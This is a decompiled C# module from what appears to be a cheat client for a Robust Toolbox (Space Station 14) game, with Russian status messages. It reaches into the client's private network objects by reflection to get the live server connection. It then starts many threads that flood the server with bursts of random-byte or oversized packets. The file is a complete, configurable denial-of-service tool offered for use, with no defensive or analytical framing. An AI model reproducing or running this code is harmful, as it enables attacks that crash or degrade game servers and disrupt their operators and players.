using System;
using System.Collections;
using System.Collections.Generic;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using Lidgren.Network;
using Robust.Shared.GameObjects;
using Robust.Shared.IoC;
using Robust.Shared.Network;
using PacketLogEntry;
using CerberusConfig;

namespace PacketSpammer;

public sealed class PacketSpammer : EntitySystem
{
	[Dependency]
	private readonly INetManager inetManager_0;

	public static List<PacketLogEntry> list_0 = new List<PacketLogEntry>();

	private static int int_0 = 1;

	private CancellationTokenSource? cancellationTokenSource_0;

	private bool bool_0;

	private Random random_0 = new Random();

	private NetPeer? netPeer_0;

	private NetConnection? netConnection_0;

	public static string string_0 = "Не запущен";

	public static int int_1 = 0;

	public static int int_2 = 0;

	public static int int_3 = 0;

	public static int int_4 = 0;

	public static bool bool_1 = false;

	public static bool bool_2 = false;

	public static DateTime? nullable_0 = null;

	private float float_2;

	private float float_3;

	private string string_1;

	private float Single_0
	{
		get
		{
			return float_2;
		}
		set
		{
			float_2 = value;
		}
	}

	private float Single_1
	{
		get
		{
			return float_3;
		}
		set
		{
			float_3 = value;
		}
	}

	private string String_0
	{
		get
		{
			return string_1;
		}
		set
		{
			string_1 = value;
		}
	}

	public override void Initialize()
	{
		((EntitySystem)this).Initialize();
	}

	public void StartPacketSpam()
	{
		try
		{
			if (!bool_0)
			{
				netPeer_0 = null;
				netConnection_0 = null;
				NetPeer? netPeer = GetNetPeer();
				NetConnection serverConnection = GetServerConnection();
				if (netPeer != null)
				{
					if (serverConnection == null)
					{
						string_0 = "Ошибка: NetConnection is null";
						return;
					}
					int_1 = 0;
					int_2 = 0;
					int_3 = 0;
					int_4 = 0;
					string_0 = "Запуск...";
					bool_0 = true;
					cancellationTokenSource_0 = new CancellationTokenSource();
					int threadCount = CerberusConfig.PacketSpammer.ThreadCount;
					for (int i = 0; i < threadCount; i++)
					{
						int GQYHxLUYqq = i;
						Interlocked.Increment(ref int_4);
						Task.Run(async delegate
						{
							await SpamLoop(GQYHxLUYqq, cancellationTokenSource_0.Token);
						});
					}
					string_0 = $"Работает ({threadCount} потоков)";
				}
				else
				{
					string_0 = "Ошибка: NetPeer is null";
				}
			}
			else
			{
				string_0 = "Уже запущен";
			}
		}
		catch (Exception ex)
		{
			string_0 = "Ошибка: " + ex.Message;
		}
	}

	private async Task SpamLoop(int threadId, CancellationToken token)
	{
		int burstCount = 0;
		try
		{
			while (!token.IsCancellationRequested && CerberusConfig.PacketSpammer.Enabled)
			{
				try
				{
					SendPacketBurst();
					burstCount++;
					Interlocked.Increment(ref int_1);
					_ = burstCount % 10;
					int burstDelay = CerberusConfig.PacketSpammer.BurstDelay;
					if (burstDelay <= 0)
					{
						await Task.Yield();
					}
					else
					{
						await Task.Delay(burstDelay, token);
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (OperationCanceledException)
		{
		}
		catch (Exception)
		{
		}
		finally
		{
			Interlocked.Decrement(ref int_4);
		}
	}

	public void StopPacketSpam()
	{
		cancellationTokenSource_0?.Cancel();
		bool_0 = false;
		string_0 = "Остановлен";
	}

	private NetPeer? GetNetPeer()
	{
		if (netPeer_0 == null)
		{
			try
			{
				FieldInfo field = ((object)inetManager_0).GetType().GetField("_netPeers", BindingFlags.Instance | BindingFlags.NonPublic);
				if (field == null)
				{
					return null;
				}
				if (!(field.GetValue(inetManager_0) is IList { Count: not 0 } list))
				{
					return null;
				}
				object obj = list[0];
				if (obj == null)
				{
					return null;
				}
				FieldInfo field2 = obj.GetType().GetField("Peer", BindingFlags.Instance | BindingFlags.Public);
				if (!(field2 == null))
				{
					object? value = field2.GetValue(obj);
					netPeer_0 = (NetPeer?)((value is NetPeer) ? value : null);
					return netPeer_0;
				}
				return null;
			}
			catch (Exception)
			{
				return null;
			}
		}
		return netPeer_0;
	}

	private NetConnection? GetServerConnection()
	{
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Invalid comparison between Unknown and I4
		if (netConnection_0 == null || (int)netConnection_0.Status != 5)
		{
			try
			{
				NetPeer netPeer = GetNetPeer();
				if (netPeer == null)
				{
					return null;
				}
				List<NetConnection> connections = netPeer.Connections;
				if (connections.Count <= 0)
				{
					return null;
				}
				netConnection_0 = connections[0];
				return netConnection_0;
			}
			catch (Exception)
			{
				return null;
			}
		}
		return netConnection_0;
	}

	private void SendPacketBurst()
	{
		try
		{
			NetPeer wpfHaCThVR = GetNetPeer();
			NetConnection V4uHCHXwtS = GetServerConnection();
			bool_1 = wpfHaCThVR != null;
			bool_2 = V4uHCHXwtS != null;
			if (wpfHaCThVR == null)
			{
				string_0 = "Ошибка: NetPeer is null";
				AddLog("Burst", "error", "NetPeer is null");
				return;
			}
			if (V4uHCHXwtS == null)
			{
				string_0 = "Ошибка: NetConnection is null";
				AddLog("Burst", "error", "NetConnection is null");
				return;
			}
			int packetsPerBurst = CerberusConfig.PacketSpammer.PacketsPerBurst;
			int uO9HQsRqxO = CerberusConfig.PacketSpammer.PacketSize;
			int DglHWSRylZ = CerberusConfig.PacketSpammer.PacketType;
			if (!CerberusConfig.PacketSpammer.LogSending || DglHWSRylZ != 0)
			{
			}
			int uRUHU4A82K = 0;
			int nmmH9cAZu4 = 0;
			Parallel.For(0, packetsPerBurst, new ParallelOptions
			{
				MaxDegreeOfParallelism = Environment.ProcessorCount
			}, delegate(int i)
			{
				//IL_0035: Unknown result type (might be due to invalid IL or missing references)
				try
				{
					NetOutgoingMessage val = wpfHaCThVR.CreateMessage(uO9HQsRqxO);
					byte[] array = new byte[uO9HQsRqxO];
					if (DglHWSRylZ != 0)
					{
						if (DglHWSRylZ != 1 && DglHWSRylZ == 2 && i % 2 == 0)
						{
							random_0.NextBytes(array);
						}
					}
					else
					{
						random_0.NextBytes(array);
					}
					((NetBuffer)val).Write(array);
					wpfHaCThVR.SendMessage(val, V4uHCHXwtS, (NetDeliveryMethod)1);
					Interlocked.Increment(ref uRUHU4A82K);
					Interlocked.Increment(ref int_2);
				}
				catch (Exception)
				{
					Interlocked.Increment(ref nmmH9cAZu4);
					Interlocked.Increment(ref int_3);
				}
			});
			nullable_0 = DateTime.Now;
			string text = ((DglHWSRylZ == 0) ? "Битые" : ((DglHWSRylZ == 1) ? "Тяжелые" : "Смешанные"));
			AddLog("Burst (" + text + ")", "success", $"{uRUHU4A82K}/{packetsPerBurst} packets sent");
		}
		catch (Exception ex)
		{
			string_0 = "Ошибка: " + ex.Message;
			AddLog("Burst", "error", ex.Message);
		}
	}

	private void AddLog(string type, string status, string error = "")
	{
		PacketLogEntry item = new PacketLogEntry
		{
			Id = int_0++,
			Type = type,
			Status = status,
			Timestamp = DateTime.Now.ToString("HH:mm:ss"),
			Error = error
		};
		lock (list_0)
		{
			list_0.Add(item);
			if (list_0.Count > 100)
			{
				list_0.RemoveAt(0);
			}
		}
	}

	public static List<PacketLogEntry> GetLogs()
	{
		lock (list_0)
		{
			return new List<PacketLogEntry>(list_0);
		}
	}

	public static void ClearLogs()
	{
		lock (list_0)
		{
			list_0.Clear();
			int_0 = 1;
		}
	}
}
